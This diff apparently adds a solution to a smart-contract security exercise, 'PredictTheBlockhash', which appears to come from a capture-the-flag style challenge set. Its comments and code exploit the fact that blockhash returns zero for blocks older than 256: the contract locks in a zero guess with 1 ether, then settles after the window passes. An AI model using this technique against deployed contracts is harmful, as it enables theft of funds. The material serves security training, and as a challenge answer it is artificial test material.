@@ -48,9 +48,26 @@ contract PredictTheBlockhash {
 contract ExploitContract {
     PredictTheBlockhash public predictTheBlockhash;
 
+    // the key is pass correct `hash` when lockInGuess(uint). The answer = blockhash(block.number + 1), and the block is the block when call lockInGuess.
+    // We can get the settlementBlockNumber, but the answer is build in function settle. Due to the result will be 0 if the blocknumber < currentBlockNumber - 256.
+    // As such, it's a good idea to pass zero to lockInGuess, and settle it after (settlementBlockNumber + 256) blocks least. In other words, we should wait for 256+1 blocks after lockInGuess is called.
+    // 
+
     constructor(PredictTheBlockhash _predictTheBlockhash) {
         predictTheBlockhash = _predictTheBlockhash;
     }
 
+    function callLockInGuess() public payable{
+        predictTheBlockhash.lockInGuess{value: 1 ether}(bytes32(0));
+    }
+
+    function settle() public {
+        predictTheBlockhash.settle();
+    }
+
+    receive() external payable {}
+
+
+    event Log(uint);
     // write your exploit code below
 }
